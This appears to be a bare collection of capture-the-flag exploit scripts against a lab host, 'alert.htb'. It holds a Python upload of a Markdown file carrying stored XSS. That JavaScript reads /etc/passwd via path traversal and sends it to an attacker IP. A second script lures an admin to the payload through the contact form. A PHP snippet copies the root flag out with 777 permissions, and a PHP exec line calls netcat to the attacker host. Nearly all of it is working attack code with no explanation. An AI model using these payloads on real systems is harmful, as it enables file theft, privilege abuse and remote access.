import requests

burp0_url = "http://alert.htb:80/visualizer.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=---------------------------51432456222711157374290855656", "Origin": "http://alert.htb", "Connection": "close", "Referer": "http://alert.htb/index.php?page=alert", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
burp0_data = "-----------------------------51432456222711157374290855656\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.md\"\r\nContent-Type: text/markdown\r\n\r\n<script>\r\nfetch('http://alert.htb/messages.php?file=../../../../../../../../etc/passwd', {\r\n    method: 'GET',\r\n})\r\n.then(response => response.text())\r\n.then(data => {\r\n    fetch('http://10.10.16.25:8000/export?p='+ encodeURIComponent(data), {\r\n        method: 'GET',\r\n    });\r\n});\n</script>\r\n-----------------------------51432456222711157374290855656--\r\n"
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

import requests

burp0_url = "http://alert.htb:80/contact.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://alert.htb", "Connection": "close", "Referer": "http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
burp0_data = {"email": "ff@mail.com", "message": "http://alert.htb/visualizer.php?link_share=6751ce983ec4f8.15811212.md"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


<?php
// Percorso del file sorgente
$source = '/root/root.txt';

// Percorso del file di destinazione
$destination = '/usr/root.txt';

// Copia il file
if (copy($source, $destination)) {
    echo "File copiato con successo a $destination\n";

    // Cambia i permessi del file (ad esempio, 0644)
    if (chmod($destination, 777)) {
        echo "Permessi del file modificati con successo.\n";
    } else {
        echo "Errore durante la modifica dei permessi del file.\n";
    }
} else {
    echo "Errore durante la copia del file.\n";
}
?>


<?php
exec("/bin/bash -c 'nc 10.10.16.25 8000'")
?>

11:08
11:09